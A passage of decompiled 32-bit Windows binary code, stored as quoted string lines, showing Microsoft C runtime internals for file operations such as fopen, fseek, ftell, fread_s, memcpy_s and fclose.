    "    *((_DWORD *)this + 2) = mbcinfo;",
    "    return this;",
    "  }",
    "  if ( !dword_10040364 )",
    "  {",
    "    locinfo = (struct __crt_locale_data *)off_1003F260;",
    "    mbcinfo = (struct __crt_multibyte_data *)off_1003F264;",
    "    goto LABEL_5;",
    "  }",
    "  v6 = sub_1001FFAC();",
    "  *(_DWORD *)this = v6;",
    "  *v3 = *(struct __crt_locale_data **)(v6 + 76);",
    "  *((_DWORD *)this + 2) = *(_DWORD *)(v6 + 72);",
    "  sub_100201C2(v6, (char *)this + 4);",
    "  sub_10020220(*(_DWORD *)this, (char *)this + 8);",
    "  v7 = *(_DWORD *)(*(_DWORD *)this + 848);",
    "  if ( (v7 & 2) == 0 )",
    "  {",
    "    *(_DWORD *)(*(_DWORD *)this + 848) = v7 | 2;",
    "    *((_BYTE *)this + 12) = 1;",
    "  }",
    "  return this;",
    "}",
    "",
    "",
    "int __cdecl __acrt_get_utf8_acp_compatibility_codepage()",
    "{",
    "  int v0; // edx",
    "  _DWORD v2[3]; // [esp+0h] [ebp-10h] BYREF",
    "  char v3; // [esp+Ch] [ebp-4h]",
    "",
    "  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v2, 0);",
    "  v0 = 65001;",
    "  if ( *(_DWORD *)(v2[1] + 8) != 65001 )",
    "    v0 = __acrt_AreFileApisANSI() == 0;",
    "  if ( v3 )",
    "    *(_DWORD *)(v2[0] + 848) &= ~2u;",
    "  return v0;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "void __thiscall unknown_libname_19(int this)",
    "{",
    "}int __thiscall sub_1001CE45(int this, int a2)",
    "{",
    "  int result; // eax",
    "",
    "  unknown_libname_19(this);",
    "  result = sub_1001CE84(this + 8, 2 * a2);",
    "  if ( result )",
    "  {",
    "    *(_DWORD *)(this + 12) = 0;",
    "    *(_BYTE *)(this + 20) = 0;",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(this + 20) = 1;",
    "    result = 0;",
    "    *(_DWORD *)(this + 12) = a2;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1001CE84(_DWORD *a1, int a2)",
    "{",
    "  int v2; // edx",
    "  int result; // eax",
    "",
    "  v2 = sub_100202D0(a2);",
    "  result = 0;",
    "  *a1 = v2;",
    "  if ( !v2 )",
    "    return 12;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _mkdir(const char *Path)",
    "{",
    "  UINT utf8_acp_compatibility_codepage; // eax",
    "  int v3; // esi",
    "  int v4[2]; // [esp+0h] [ebp-18h] BYREF",
    "  void *Block; // [esp+8h] [ebp-10h]",
    "  int v6; // [esp+Ch] [ebp-Ch]",
    "  int v7; // [esp+10h] [ebp-8h]",
    "  char v8; // [esp+14h] [ebp-4h]",
    "",
    "  if ( !Path )",
    "    return _wmkdir(0);",
    "  v4[0] = 0;",
    "  v4[1] = 0;",
    "  Block = 0;",
    "  v6 = 0;",
    "  v7 = 0;",
    "  v8 = 0;",
    "  utf8_acp_compatibility_codepage = __acrt_get_utf8_acp_compatibility_codepage();",
    "  if ( sub_1001CD4D(Path, (int)v4, utf8_acp_compatibility_codepage) )",
    "    v3 = -1;",
    "  else",
    "    v3 = _wmkdir((const wchar_t *)Block);",
    "  if ( v8 )",
    "    _free_base(Block);",
    "  return v3;",
    "}",
    "",
    "",
    "int __cdecl common_fsopen<char>(_BYTE *a1, _BYTE *a2)",
    "{",
    "  int v3; // esi",
    "  FILE *Stream; // [esp+14h] [ebp-1Ch] BYREF",
    "  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h]",
    "",
    "  if ( !a1 || !a2 || !*a2 )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 0;",
    "  }",
    "  if ( !*a1 )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    return 0;",
    "  }",
    "  __acrt_stdio_allocate_stream(&Stream);",
    "  if ( !Stream )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 24;",
    "    return 0;",
    "  }",
    "  ms_exc.registration.TryLevel = 0;",
    "  v3 = sub_1002244F(a1);",
    "  ms_exc.registration.TryLevel = -2;",
    "  if ( !v3 )",
    "    __acrt_stdio_free_stream(Stream);",
    "  _unlock_file(Stream);",
    "  return v3;",
    "}",
    "",
    "",
    "FILE *__cdecl fopen(const char *FileName, const char *Mode)",
    "{",
    "  return (FILE *)common_fsopen<char>(FileName, Mode);",
    "}",
    "",
    "",
    "int __cdecl sub_1001CFDD(__int64 a1, __int64 a2, int *a3)",
    "{",
    "  int v3; // edi",
    "  int result; // eax",
    "  int v5; // edx",
    "",
    "  v3 = (unsigned __int64)(a1 - a2) >> 32;",
    "  result = 0;",
    "  if ( a1 < 0 == a2 < 0 || (v5 = -1, a1 < 0 == v3 < 0) )",
    "  {",
    "    v5 = a1 - a2;",
    "  }",
    "  else",
    "  {",
    "    result = -2147024362;",
    "    v3 = -1;",
    "  }",
    "  *a3 = v5;",
    "  a3[1] = v3;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl common_fseek(FILE *Stream, int a2, int a3, unsigned int a4, __crt_cached_ptd_host *a5)",
    "{",
    "  int v6; // [esp+10h] [ebp-1Ch]",
    "",
    "  if ( Stream && a4 <= 2 )",
    "  {",
    "    _lock_file(Stream);",
    "    v6 = common_fseek_nolock(Stream, a2, a3, a4, a5);",
    "    _unlock_file(Stream);",
    "    return v6;",
    "  }",
    "  else",
    "  {",
    "    *((_DWORD *)a5 + 6) = 22;",
    "    *((_BYTE *)a5 + 28) = 1;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a5);",
    "    return -1;",
    "  }",
    "}",
    "",
    "",
    "char __cdecl common_fseek_binary_mode_read_only_fast_track_nolock(int *a1, __int64 a2, int a3)",
    "{",
    "  int v3; // edx",
    "  int v4; // eax",
    "  LPCRITICAL_SECTION v5; // ecx",
    "  __int64 v6; // rax",
    "  int *v7; // esi",
    "  char result; // al",
    "  __int64 v9; // rax",
    "  int v10; // edi",
    "",
    "  if ( a3 == 2 )",
    "    return 0;",
    "  if ( (a1[3] & 0x4C0) == 0 )",
    "    return 0;",
    "  if ( (a1[3] & 6) != 0 )",
    "    return 0;",
    "  if ( a1[2] <= 0 )",
    "    return 0;",
    "  v3 = a1[4];",
    "  v4 = 56 * (v3 & 0x3F);",
    "  v5 = lpCriticalSection[v3 >> 6];",
    "  if ( *((char *)&v5[1].LockSemaphore + v4) < 0 || *((_BYTE *)&v5[1].LockSemaphore + v4 + 1) )",
    "    return 0;",
    "  if ( a3 )",
    "  {",
    "    v7 = a1;",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v6) = _lseeki64_nolock(v3, 0, 1u);",
    "    if ( v6 < 0 )",
    "      return 0;",
    "    v7 = a1;",
    "    if ( sub_1001CFDD(a2, v6 - a1[2], (int *)&a2) < 0 )",
    "      return 0;",
    "  }",
    "  v9 = v7[1] - *v7;",
    "  if ( SHIDWORD(v9) > SHIDWORD(a2) )",
    "    return 0;",
    "  v10 = a2;",
    "  if ( SHIDWORD(v9) >= SHIDWORD(a2) && (unsigned int)v9 > (unsigned int)a2 )",
    "    return 0;",
    "  if ( a2 > v7[2] )",
    "    return 0;",
    "  result = 1;",
    "  *v7 += a2;",
    "  a1[2] -= v10;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl common_fseek_nolock(FILE *Stream, __int64 liDistanceToMove, DWORD dwMoveMethod, int a4)",
    "{",
    "  int result; // eax",
    "  DWORD v5; // esi",
    "  LARGE_INTEGER v6; // kr00_8",
    "  char *cnt; // ecx",
    "  int v8; // eax",
    "  int v9; // edx",
    "",
    "  if ( (Stream->_flag & 0x2000) != 0 )",
    "  {",
    "    _InterlockedAnd(&Stream->_flag, 0xFFFFFFF7);",
    "    v5 = dwMoveMethod;",
    "    v6.QuadPart = liDistanceToMove;",
    "    if ( common_fseek_binary_mode_read_only_fast_track_nolock((int *)Stream, liDistanceToMove, dwMoveMethod) )",
    "      return 0;",
    "    if ( dwMoveMethod == 1 )",
    "    {",
    "      v6.QuadPart = _ftelli64_nolock_internal(Stream, a4) + liDistanceToMove;",
    "      v5 = 0;",
    "    }",
    "    __acrt_stdio_flush_nolock(Stream, a4);",
    "    cnt = (char *)Stream->_cnt;",
    "    Stream->_base = 0;",
    "    Stream->_ptr = cnt;",
    "    if ( (Stream->_flag & 4) != 0 )",
    "    {",
    "      _InterlockedAnd(&Stream->_flag, 0xFFFFFFFC);",
    "    }",
    "    else if ( (Stream->_flag & 0x41) == 0x41 && (Stream->_flag & 0x100) == 0 )",
    "    {",
    "      Stream->_bufsiz = 512;",
    "    }",
    "    v8 = _lseeki64_nolock_internal(Stream->_file, v6, v5, a4);",
    "    result = v9 & v8;",
    "    if ( result != -1 )",
    "      return 0;",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a4 + 28) = 1;",
    "    *(_DWORD *)(a4 + 24) = 22;",
    "    return -1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl fseek(FILE *Stream, int Offset, int Origin)",
    "{",
    "  int v3; // esi",
    "  _BYTE v5[40]; // [esp+4h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v5, 0);",
    "  v3 = common_fseek(Stream, Offset, Offset >> 31, Origin, (__crt_cached_ptd_host *)v5);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v5);",
    "  return v3;",
    "}",
    "",
    "",
    "int __cdecl common_ftell<long>(FILE *Stream, __crt_cached_ptd_host *a2)",
    "{",
    "  int v3; // [esp+10h] [ebp-1Ch]",
    "",
    "  if ( Stream )",
    "  {",
    "    _lock_file(Stream);",
    "    v3 = common_ftell_nolock<long>(Stream, a2);",
    "    _unlock_file(Stream);",
    "    return v3;",
    "  }",
    "  else",
    "  {",
    "    *((_BYTE *)a2 + 28) = 1;",
    "    *((_DWORD *)a2 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a2);",
    "    return -1;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl common_ftell_nolock<long>(FILE *Stream, __crt_cached_ptd_host *a2)",
    "{",
    "  __int64 v2; // rax",
    "",
    "  LODWORD(v2) = common_ftell_nolock<__int64>(Stream, a2);",
    "  if ( v2 > 0x7FFFFFFF )",
    "  {",
    "    *((_BYTE *)a2 + 28) = 1;",
    "    LODWORD(v2) = -1;",
    "    *((_DWORD *)a2 + 6) = 22;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "unsigned int __cdecl common_ftell_nolock<__int64>(FILE *Stream, __crt_cached_ptd_host *a2)",
    "{",
    "  int v3; // eax",
    "  int v4; // ebx",
    "  int v5; // eax",
    "  int v6; // edx",
    "  unsigned int v7; // ebx",
    "  FILE *v8; // esi",
    "  int v9; // ecx",
    "  unsigned __int64 v10; // kr08_8",
    "  int v11; // edx",
    "  int v12; // [esp+4h] [ebp-18h]",
    "  int v13; // [esp+8h] [ebp-14h]",
    "  int v14; // [esp+Ch] [ebp-10h]",
    "  int v15; // [esp+10h] [ebp-Ch]",
    "  char v16; // [esp+14h] [ebp-8h]",
    "  int v17; // [esp+18h] [ebp-4h]",
    "",
    "  if ( !Stream )",
    "  {",
    "    *((_BYTE *)a2 + 28) = 1;",
    "    *((_DWORD *)a2 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a2);",
    "    return -1;",
    "  }",
    "  v3 = _fileno(Stream);",
    "  v4 = v3;",
    "  if ( (int)Stream->_base < 0 )",
    "    Stream->_base = 0;",
    "  v5 = _lseeki64_internal(v3, 0, 1u, a2);",
    "  v17 = v6;",
    "  v12 = v5;",
    "  if ( v6 < 0 )",
    "    return -1;",
    "  if ( (Stream->_flag & 0xC0) == 0 )",
    "    return v5 - (unsigned int)Stream->_base;",
    "  v15 = v4 >> 6;",
    "  v14 = 56 * (v4 & 0x3F);",
    "  v16 = *((_BYTE *)&lpCriticalSection[v4 >> 6][1].LockSemaphore + v14 + 1);",
    "  v7 = (unsigned int)&Stream->_ptr[-Stream->_cnt];",
    "  if ( (Stream->_flag & 3) == 0 )",
    "  {",
    "    if ( (Stream->_flag & 4) != 0 )",
    "      goto LABEL_17;",
    "    *((_BYTE *)a2 + 28) = 1;",
    "    *((_DWORD *)a2 + 6) = 22;",
    "    return -1;",
    "  }",
    "  if ( v16 == 1 && (*((_BYTE *)&lpCriticalSection[v15][1].SpinCount + v14 + 1) & 2) != 0 )",
    "    return sub_1001D726(Stream, v5, v6, (int)a2);",
    "  if ( *((char *)&lpCriticalSection[v15][1].LockSemaphore + v14) < 0 )",
    "  {",
    "    v8 = Stream;",
    "    v13 = (int)&Stream->_ptr[-Stream->_cnt] >> 31;",
    "    v10 = sub_1001D8EC(Stream->_cnt, Stream->_ptr, v16) + __PAIR64__(v13, v7);",
    "    v9 = HIDWORD(v10);",
    "    v7 = v10;",
    "    goto LABEL_18;",
    "  }",
    "LABEL_17:",
    "  v8 = Stream;",
    "  v9 = (int)&Stream->_ptr[-Stream->_cnt] >> 31;",
    "LABEL_18:",
    "  v11 = v12;",
    "  if ( v17 | v12 )",
    "  {",
    "    if ( (v8->_flag & 1) != 0 )",
    "      return common_ftell_read_mode_nolock(Stream, v12, v17, v7, v9, a2);",
    "    if ( v16 == 1 )",
    "    {",
    "      v7 = __SPAIR64__(v9, v7) / 2;",
    "      v11 = v12;",
    "    }",
    "    v7 += v11;",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "int __cdecl common_ftell_read_mode_nolock(",
    "        FILE *Stream,",
    "        LARGE_INTEGER liDistanceToMove,",
    "        __int64 a3,",
    "        __crt_cached_ptd_host *a4)",
    "{",
    "  int v4; // ebx",
    "  __int64 v5; // rax",
    "  __int64 v6; // rax",
    "  __int64 v7; // rax",
    "  int v8; // ebx",
    "  __int64 v9; // rax",
    "  __int64 bufsiz; // rax",
    "  unsigned int v11; // ecx",
    "  unsigned __int64 v12; // kr20_8",
    "  int v13; // eax",
    "  int v14; // edx",
    "  bool v15; // cc",
    "  int FileHandle; // [esp+10h] [ebp-20h]",
    "  LPCRITICAL_SECTION v18; // [esp+14h] [ebp-1Ch]",
    "  int v19; // [esp+18h] [ebp-18h]",
    "  char v20; // [esp+1Ch] [ebp-14h]",
    "  char *base; // [esp+20h] [ebp-10h]",
    "  unsigned int v22; // [esp+20h] [ebp-10h]",
    "  int v23; // [esp+28h] [ebp-8h]",
    "  int v24; // [esp+2Ch] [ebp-4h]",
    "  int v25; // [esp+2Ch] [ebp-4h]",
    "",
    "  FileHandle = _fileno(Stream);",
    "  v4 = 1;",
    "  v18 = lpCriticalSection[FileHandle >> 6];",
    "  v19 = 56 * (FileHandle & 0x3F);",
    "  v20 = *((_BYTE *)&v18[1].LockSemaphore + v19 + 1);",
    "  if ( v20 == 1 )",
    "    v23 = 2;",
    "  else",
    "    v23 = 1;",
    "  base = Stream->_base;",
    "  if ( base )",
    "  {",
    "    v6 = (int)base;",
    "    v22 = (unsigned int)&base[(unsigned int)&Stream->_ptr[-Stream->_cnt]];",
    "    v24 = (unsigned int)&Stream->_ptr[__PAIR64__(HIDWORD(v6), Stream->_base) - Stream->_cnt] >> 32;",
    "    if ( *((char *)&v18[1].LockSemaphore + v19) >= 0 )",
    "    {",
    "      v7 = (__int64)&Stream->_ptr[__PAIR64__(HIDWORD(v6), Stream->_base) - Stream->_cnt] / (unsigned int)v23;",
    "      v8 = v23;",
    "      return liDistanceToMove.QuadPart + a3 / (unsigned int)v8 - v7;",
    "    }",
    "    LODWORD(v9) = _lseeki64_internal(FileHandle, 0, 2u, a4);",
    "    if ( v9 == liDistanceToMove.QuadPart )",
    "    {",
    "      v12 = __PAIR64__(v24, v22) + sub_1001D8EC(Stream->_cnt, Stream->_cnt + v22, v20);",
    "      HIDWORD(bufsiz) = HIDWORD(v12);",
    "      v11 = v12;",
    "      if ( (Stream->_flag & 0x20) == 0 )",
    "      {",
    "LABEL_29:",
    "        v8 = v23;",
    "        v7 = __SPAIR64__(HIDWORD(bufsiz), v11) / (unsigned int)v23;",
    "        return liDistanceToMove.QuadPart + a3 / (unsigned int)v8 - v7;",
    "      }",
    "      if ( v20 == 1 || v20 == 2 )",
    "        v4 = 2;",
    "    }",
    "    else",
    "    {",
    "      v13 = _lseeki64_internal(FileHandle, liDistanceToMove, 0, a4);",
    "      if ( (v14 & v13) == 0xFFFFFFFF )",
    "      {",
    "        LODWORD(v5) = -1;",
    "        return v5;",
    "      }",
    "      v15 = v24 < 0;",
    "      if ( v24 <= 0 && ((v25 = 512, v15) || v22 <= 0x200) && (Stream->_flag & 0x40) != 0 && (Stream->_flag & 0x100) == 0 )",
    "      {",
    "        HIDWORD(bufsiz) = 0;",
    "      }",
    "      else",
    "      {",
    "        bufsiz = Stream->_bufsiz;",
    "        v25 = Stream->_bufsiz;",
    "      }",
    "      if ( (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v19) & 4) == 0 )",
    "      {",
    "        v11 = v25;",
    "        goto LABEL_29;",
    "      }",
    "      if ( v20 == 1 || v20 == 2 )",
    "        v4 = 2;",
    "      v11 = v25;",
    "    }",
    "    HIDWORD(bufsiz) = ((unsigned int)v4 + __PAIR64__(HIDWORD(bufsiz), v11)) >> 32;",
    "    v11 += v4;",
    "    goto LABEL_29;",
    "  }",
    "  LODWORD(v5) = liDistanceToMove.LowPart;",
    "  return v5;",
    "}",
    "",
    "",
    "DWORD __cdecl sub_1001D726(FILE *Stream, LARGE_INTEGER liDistanceToMove, __crt_cached_ptd_host *a3)",
    "{",
    "  int v3; // eax",
    "  int v4; // ebx",
    "  int v6; // kr00_4",
    "  int v7; // edi",
    "  int v8; // eax",
    "  void *v9; // edx",
    "  LPCRITICAL_SECTION v10; // ecx",
    "  int v11; // edx",
    "  unsigned int v12; // ebx",
    "  unsigned __int8 *v13; // edi",
    "  unsigned __int8 *v14; // ecx",
    "  __int64 v15; // kr08_8",
    "  DWORD NumberOfBytesRead; // [esp+8h] [ebp-101Ch] BYREF",
    "  __int64 v17; // [esp+Ch] [ebp-1018h]",
    "  int v18; // [esp+14h] [ebp-1010h]",
    "  __crt_cached_ptd_host *v19; // [esp+18h] [ebp-100Ch]",
    "  DWORD v20; // [esp+1Ch] [ebp-1008h]",
    "  _BYTE Buffer[4096]; // [esp+20h] [ebp-1004h] BYREF",
    "",
    "  v19 = a3;",
    "  v3 = _fileno(Stream);",
    "  v4 = v3;",
    "  if ( !Stream->_base )",
    "    return liDistanceToMove.LowPart;",
    "  v6 = (int)&Stream->_ptr[-Stream->_cnt] / 2;",
    "  HIDWORD(v17) = (unsigned __int64)((__int64)&Stream->_ptr[-Stream->_cnt] / 2) >> 32;",
    "  v20 = v6;",
    "  v7 = 56 * (v3 & 0x3F);",
    "  v8 = _lseeki64_internal(v3, *(LARGE_INTEGER *)((char *)&lpCriticalSection[v3 >> 6][1].RecursionCount + v7), 0, v19);",
    "  v10 = lpCriticalSection[v4 >> 6];",
    "  v18 = v8;",
    "  if ( v8 != *(LONG *)((char *)&v10[1].RecursionCount + v7) )",
    "    return -1;",
    "  if ( v9 != *(void **)((char *)&v10[1].OwningThread + v7) )",
    "    return -1;",
    "  if ( !ReadFile(*(HANDLE *)((char *)&v10[1].DebugInfo + v7), Buffer, 0x1000u, &NumberOfBytesRead, 0) )",
    "    return -1;",
    "  _lseeki64_internal(v4, liDistanceToMove, 0, v19);",
    "  if ( v11 < 0 )",
    "    return -1;",
    "  v12 = HIDWORD(v17);",
    "  if ( SHIDWORD(v17) > 0 || v17 >= 0 && v20 > NumberOfBytesRead )",
    "    return -1;",
    "  v13 = &Buffer[NumberOfBytesRead];",
    "  v17 = 0;",
    "  v14 = Buffer;",
    "  if ( v20 || v12 )",
    "  {",
    "    v15 = v17;",
    "    do",
    "    {",
    "      if ( v14 >= v13 )",
    "        break;",
    "      if ( *v14 == 13 )",
    "      {",
    "        if ( v14 < v13 - 1 && v14[1] == 10 )",
    "          ++v14;",
    "      }",
    "      else",
    "      {",
    "        v14 += byte_1003F2A8[*v14];",
    "      }",
    "      ++v15;",
    "      ++v14;",
    "    }",
    "    while ( v15 != __PAIR64__(v12, v20) );",
    "  }",
    "  return v18 + v14 - Buffer;",
    "}",
    "",
    "",
    "int __cdecl sub_1001D8EC(_WORD *a1, _WORD *a2, char a3)",
    "{",
    "  _BYTE *v3; // eax",
    "  int v4; // ecx",
    "  _WORD *v6; // ecx",
    "  int v7; // eax",
    "",
    "  if ( a3 == 1 || a3 == 2 )",
    "  {",
    "    v6 = a1;",
    "    v7 = 0;",
    "    while ( v6 != a2 )",
    "    {",
    "      if ( *v6 == 10 )",
    "        ++v7;",
    "      ++v6;",
    "    }",
    "    return 2 * v7;",
    "  }",
    "  else",
    "  {",
    "    v3 = a1;",
    "    v4 = 0;",
    "    while ( v3 != (_BYTE *)a2 )",
    "    {",
    "      if ( *v3 == 10 )",
    "        ++v4;",
    "      ++v3;",
    "    }",
    "    return v4;",
    "  }",
    "}",
    "",
    "",
    "unsigned int __cdecl _ftelli64_nolock_internal(FILE *Stream, __crt_cached_ptd_host *a2)",
    "{",
    "  return common_ftell_nolock<__int64>(Stream, a2);",
    "}",
    "",
    "",
    "int __cdecl ftell(FILE *Stream)",
    "{",
    "  int v1; // esi",
    "  _BYTE v3[40]; // [esp+4h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v3, 0);",
    "  v1 = common_ftell<long>(Stream, (__crt_cached_ptd_host *)v3);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v3);",
    "  return v1;",
    "}",
    "",
    "",
    "unsigned int __cdecl sub_1001D990(void *a1, size_t Size, unsigned int a3, unsigned int a4, FILE *Stream)",
    "{",
    "  rsize_t v6; // edx",
    "  unsigned int v7; // ecx",
    "  char *base; // eax",
    "  int v9; // eax",
    "  char *cnt; // eax",
    "  int v11; // eax",
    "  int v12; // ecx",
    "  DWORD v13; // [esp-4h] [ebp-28h]",
    "  int v14; // [esp+10h] [ebp-14h]",
    "  unsigned int bufsiz; // [esp+14h] [ebp-10h]",
    "  size_t v16; // [esp+18h] [ebp-Ch]",
    "  _BYTE *Destination; // [esp+1Ch] [ebp-8h]",
    "  int v18; // [esp+20h] [ebp-4h]",
    "",
    "  if ( !a3 || !a4 )",
    "    return 0;",
    "  if ( !a1 )",
    "    goto LABEL_4;",
    "  if ( !Stream || a4 > 0xFFFFFFFF / a3 )",
    "  {",
    "    if ( Size != -1 )",
    "      memset(a1, 0, Size);",
    "    if ( !Stream || a4 > 0xFFFFFFFF / a3 )",
    "    {",
    "LABEL_4:",
    "      *(_DWORD *)sub_1001E025() = 22;",
    "      goto LABEL_5;",
    "    }",
    "  }",
    "  if ( (Stream->_flag & 0x4C0) != 0 )",
    "    bufsiz = Stream->_bufsiz;",
    "  else",
    "    bufsiz = 4096;",
    "  v6 = Size;",
    "  Destination = a1;",
    "  v16 = Size;",
    "  v7 = a4 * a3;",
    "  v18 = a4 * a3;",
    "  if ( !(a4 * a3) )",
    "    return a4;",
    "  while ( (Stream->_flag & 0x4C0) != 0 )",
    "  {",
    "    base = Stream->_base;",
    "    if ( !base )",
    "      break;",
    "    if ( (int)base < 0 )",
    "      goto LABEL_42;",
    "    if ( v7 < (unsigned int)base )",
    "      base = (char *)v7;",
    "    v14 = (int)base;",
    "    if ( (unsigned int)base > v6 )",
    "      goto LABEL_39;",
    "    memcpy_s(Destination, v6, Stream->_ptr, (const rsize_t)base);",
    "    v9 = v14;",
    "    Stream->_base -= v14;",
    "    v7 = v18 - v14;",
    "    Stream->_ptr += v14;",
    "LABEL_24:",
    "    Destination += v9;",
    "    v6 = v16 - v9;",
    "LABEL_37:",
    "    v18 = v7;",
    "    v16 = v6;",
    "    if ( !v7 )",
    "      return a4;",
    "  }",
    "  if ( v7 >= bufsiz )",
    "  {",
    "    if ( v7 > 0x7FFFFFFF )",
    "      v7 = 0x7FFFFFFF;",
    "    if ( bufsiz )",
    "    {",
    "      v7 -= v7 % bufsiz;",
    "      v6 = v16;",
    "    }",
    "    if ( v7 > v6 )",
    "      goto LABEL_39;",
    "    cnt = (char *)Stream->_cnt;",
    "    Stream->_base = 0;",
    "    v13 = v7;",
    "    Stream->_ptr = cnt;",
    "    v11 = _fileno(Stream);",
    "    v9 = sub_10022F2D(v11, (LPWSTR)Destination, v13);",
    "    if ( !v9 )",
    "    {",
    "      _InterlockedOr(&Stream->_flag, 8u);",
    "      return (a4 * a3 - v18) / a3;",
    "    }",
    "    if ( v9 < 0 )",
    "    {",
    "LABEL_42:",
    "      _InterlockedOr(&Stream->_flag, 0x10u);",
    "      return (a4 * a3 - v18) / a3;",
    "    }",
    "    v7 = v18 - v9;",
    "    goto LABEL_24;",
    "  }",
    "  v12 = sub_10023444(Stream);",
    "  if ( v12 == -1 )",
    "    return (a4 * a3 - v18) / a3;",
    "  if ( v16 )",
    "  {",
    "    *Destination++ = v12;",
    "    v7 = v18 - 1;",
    "    v6 = v16 - 1;",
    "    bufsiz = Stream->_bufsiz;",
    "    goto LABEL_37;",
    "  }",
    "LABEL_39:",
    "  if ( Size != -1 )",
    "    memset(a1, 0, Size);",
    "  *(_DWORD *)sub_1001E025() = 34;",
    "LABEL_5:",
    "  _invalid_parameter_noinfo();",
    "  return 0;",
    "}",
    "",
    "",
    "size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream)",
    "{",
    "  return fread_s(Buffer, 0xFFFFFFFF, ElementSize, ElementCount, Stream);",
    "}",
    "",
    "",
    "size_t __cdecl fread_s(void *Buffer, size_t BufferSize, size_t ElementSize, size_t ElementCount, FILE *Stream)",
    "{",
    "  size_t v6; // [esp+10h] [ebp-1Ch]",
    "",
    "  if ( ElementSize && ElementCount )",
    "  {",
    "    if ( Stream )",
    "    {",
    "      _lock_file(Stream);",
    "      v6 = sub_1001D990(Buffer, BufferSize, ElementSize, ElementCount, Stream);",
    "      _unlock_file(Stream);",
    "      return v6;",
    "    }",
    "    if ( BufferSize != -1 )",
    "      memset(Buffer, 0, BufferSize);",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "errno_t __cdecl memcpy_s(",
    "        void *const Destination,",
    "        const rsize_t DestinationSize,",
    "        const void *const Source,",
    "        const rsize_t SourceSize)",
    "{",
    "  errno_t *v5; // eax",
    "  errno_t v6; // [esp-8h] [ebp-Ch]",
    "",
    "  if ( !SourceSize )",
    "    return 0;",
    "  if ( !Destination )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "  if ( Source && DestinationSize >= SourceSize )",
    "  {",
    "    memmove(Destination, Source, SourceSize);",
    "    return 0;",
    "  }",
    "  memset(Destination, 0, DestinationSize);",
    "  if ( !Source )",
    "  {",
    "    v5 = (errno_t *)sub_1001E025();",
    "    v6 = 22;",
    "LABEL_12:",
    "    *v5 = v6;",
    "    _invalid_parameter_noinfo();",
    "    return v6;",
    "  }",
    "  if ( DestinationSize < SourceSize )",
    "  {",
    "    v5 = (errno_t *)sub_1001E025();",
    "    v6 = 34;",
    "    goto LABEL_12;",
    "  }",
    "  return 22;",
    "}",
    "",
    "",
    "int __cdecl _fclose_internal(FILE *Stream, struct __crt_cached_ptd_host *a2)",
    "{",
    "  int v3; // [esp+14h] [ebp-1Ch]",
    "",
    "  if ( !Stream )",
    "  {",
    "    *((_BYTE *)a2 + 28) = 1;",
    "    *((_DWORD *)a2 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a2);",
    "    return -1;",
    "  }",
    "  if ( (Stream->_flag & 0x1000) != 0 )",
    "  {",
    "    __acrt_stdio_free_stream(Stream);",
    "    return -1;",
    "  }",
    "  _lock_file(Stream);",
    "  v3 = _fclose_nolock_internal(Stream, a2);",
    "  _unlock_file(Stream);",
    "  return v3;",
    "}",
    "",
    "",
    "int __cdecl _fclose_nolock_internal(FILE *Stream, struct __crt_cached_ptd_host *a2)",
    "{",
    "  int v3; // edi",
    "  int v4; // eax",
    "",
    "  if ( Stream )",
    "  {",
    "    v3 = -1;",
    "    if ( (Stream->_flag & 0x2000) != 0 )",
    "    {",
    "      v3 = __acrt_stdio_flush_nolock(Stream, (int)a2);",
    "      __acrt_stdio_free_buffer_nolock(Stream);",
    "      v4 = _fileno(Stream);",
    "      if ( sub_100234E0(v4, a2) >= 0 )",
    "      {",
    "        if ( Stream->_tmpfname )",
    "        {",
    "          _free_base(Stream->_tmpfname);",
    "          Stream->_tmpfname = 0;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v3 = -1;",
    "      }",
    "    }",
    "    __acrt_stdio_free_stream(Stream);",
    "    return v3;",
    "  }",
    "  else",
    "  {",
    "    *((_BYTE *)a2 + 28) = 1;",
    "    *((_DWORD *)a2 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a2);",
    "    return -1;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl fclose(FILE *Stream)",
    "{",
    "  int v1; // esi",
    "  _BYTE v3[40]; // [esp+4h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v3, 0);",
